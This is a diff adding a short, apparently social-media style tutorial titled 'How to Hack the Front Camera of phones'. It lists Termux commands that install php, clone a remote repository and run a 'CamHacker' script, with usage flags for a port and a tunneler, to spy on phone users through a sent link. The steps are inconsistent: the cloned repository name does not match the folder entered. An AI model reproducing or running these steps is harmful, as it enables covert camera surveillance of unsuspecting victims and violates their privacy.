@@ -1,0 +1,16 @@
+✅ How to Hack the Front Camera of phones via a Buttermix link 
+
+🔸🔸🔸🔸🔸🔸🔸🔸🔸
+
+
+1️⃣termux-setup-storage
+2️⃣apt update 
+3️⃣apt upgrade
+4️⃣apt install php
+5️⃣git clone https://github.com/Maryio01/mary.git
+6️⃣cd CamHacker
+7️⃣bash ch.sh
+
+🔤Usage:
+bash ch.sh [-h] [-o OPTION] [-p PORT] [-t TUNNELER] [-u] [-nu]
+🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸
